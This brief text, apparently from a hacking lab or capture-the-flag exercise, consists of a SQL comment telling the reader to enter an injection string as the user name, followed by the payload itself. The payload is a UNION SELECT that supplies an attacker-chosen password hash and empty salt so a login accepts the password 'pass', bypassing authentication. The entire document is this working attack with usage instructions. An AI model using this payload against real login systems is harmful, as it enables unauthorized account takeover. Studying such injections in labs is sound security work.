-- Enter the following injection as the user name, and the password "pass". If you want to use a different password, calculate a different hash.

bob' UNION SELECT 1 as id, 'd74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1' as password_hash, '' as salt FROM users WHERE'1'='1